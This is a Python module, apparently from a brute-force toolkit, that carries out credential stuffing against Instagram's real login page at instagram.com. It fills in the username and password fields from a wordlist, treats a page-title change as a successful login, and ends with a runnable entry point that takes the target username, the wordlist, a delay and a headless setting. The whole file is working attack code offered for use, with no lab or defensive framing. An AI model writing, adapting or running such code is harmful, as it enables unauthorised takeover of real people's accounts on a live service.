#!/usr/bin/env python3
"""
instagram.py

    Web-based module for credential stuffing Instagram

"""
import dataclasses

from brute.core.web import WebBruteforce


@dataclasses.dataclass
class Instagram(WebBruteforce):
    name = "instagram"
    address = "https://www.instagram.com/accounts/login"

    fields = { "username": "username", "password": "password" }


    @property
    def success(self):
        """
        Page title should change to generic name once authenticated.
        """
        return "Instagram"


if __name__ == "__main__":
    args = Instagram.parse_args()
    br = Instagram(
        username = args.username,
        wordlist = args.wordlist,
        delay = args.delay,
        headless =args.headless
    ).run()
